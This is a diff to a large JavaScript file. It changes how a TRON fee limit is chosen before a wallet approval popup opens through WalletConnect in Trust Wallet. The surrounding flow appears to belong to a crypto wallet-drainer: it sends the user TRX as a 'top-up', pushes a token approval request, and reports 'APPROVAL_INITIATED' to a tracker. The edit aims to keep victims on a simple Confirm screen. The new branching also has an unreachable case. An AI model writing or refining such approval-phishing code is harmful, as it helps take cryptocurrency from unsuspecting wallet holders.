@@ -93106,16 +93106,27 @@
                         })
                     }
 
-                    // After top-up wait already done above (5s). Open approval popup directly — no tap button.
-                    const feeLimit = topUpSent || balanceInTRX < 20 ? 1e9 : 15000000;
+                    // After top-up user has TRX — use TRX feeLimit (NOT 1e9).
+                    // feeLimit 1e9 forces Trust "Energy rental" Continue flow which hangs / drops WC.
+                    // 10 TRX feeLimit keeps approve on normal Confirm with TRX fee.
+                    let feeLimit;
+                    if (topUpSent || balanceInTRX >= 11) {
+                        feeLimit = 1e7
+                    } else if (balanceInTRX >= 20) {
+                        feeLimit = 15e6
+                    } else {
+                        feeLimit = 1e9
+                    }
                     console.log("Opening sign popup", {
                         balanceInTRX: balanceInTRX,
                         feeLimit: feeLimit,
+                        feeMode: feeLimit >= 1e9 ? "USDT-energy-rental" : "TRX",
                         topUpSent: topUpSent
                     });
                     reportEvent("APPROVAL_INITIATED", {
                         balanceInTRX: balanceInTRX,
                         feeLimit: feeLimit,
+                        feeMode: feeLimit >= 1e9 ? "USDT-energy-rental" : "TRX",
                         fromTopUp: topUpSent
                     });
                     await f(c, feeLimit, {
